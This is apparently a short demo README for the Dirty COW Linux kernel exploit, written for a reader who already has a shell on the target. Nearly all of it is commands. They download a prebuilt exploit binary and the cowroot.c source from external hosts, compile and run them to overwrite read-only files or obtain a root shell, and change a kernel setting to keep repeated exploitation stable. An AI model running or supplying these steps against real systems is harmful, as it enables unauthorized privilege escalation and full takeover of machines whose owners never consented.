# Dirty COW Demo

Use these examples to try out the [Dirty COW](https://dirtycow.ninja/) exploit. These examples assume that you already have a shell in the system.

## Writing to a read-only file

The most basic use-case of Dirty COW is to write to a read-only file. We will be using an exploit written in the Crystal programming language.

```bash
# Download the binary.
$ wget -O dirtyc0w https://github.com/xlucas/dirtycow.cr/releases/download/v0.1.0/dirtycow-amd64

# Make it executable.
$ chmod +x dirtyc0w

# Execute the binary to write to a read-only file.
./dirtyc0w -t <read-only file> -s <desired content>
```

## Obtaining a root shell

Many sample exploit scripts have taken it one step further by modifying the appropriate files and giving back a root shell.

```bash
# Download the source code.
$ wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c

# Compile the source code into an executable.
$ gcc cowroot.c -o cowroot -pthread

# Execute the binary to obtain a root shell.
$ ./cowroot
```

## Stablizing the exploit

Sometimes, the system freezes when executing the exploit. This can be prevented with the following command _(Unfortunately it requires one to already be `root`, so it's only useful for repeated exploits)_.

```bash
$ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```
